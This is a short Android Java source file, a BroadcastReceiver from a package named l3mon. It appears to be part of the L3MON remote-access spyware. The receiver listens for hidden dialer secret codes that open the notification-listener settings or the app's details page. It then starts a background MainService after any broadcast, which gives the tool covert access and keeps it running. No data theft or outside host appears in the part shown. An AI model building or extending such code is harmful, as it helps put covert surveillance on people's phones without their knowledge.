package com.etechd.l3mon;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;

public class MyReceiver extends BroadcastReceiver {
    public MyReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.

        if(intent.getAction().equals("android.provider.Telephony.SECRET_CODE")) {
            String uri = intent.getDataString();
            String[] sep = uri.split("://");
            if (sep[1].equalsIgnoreCase("8088")) {
                context.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } else if (sep[1].equalsIgnoreCase("5055")) {
                Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
                context.startActivity(i);
            }
        }

        intent = new Intent( context, MainService.class );
        context.startService(intent);
    }
}
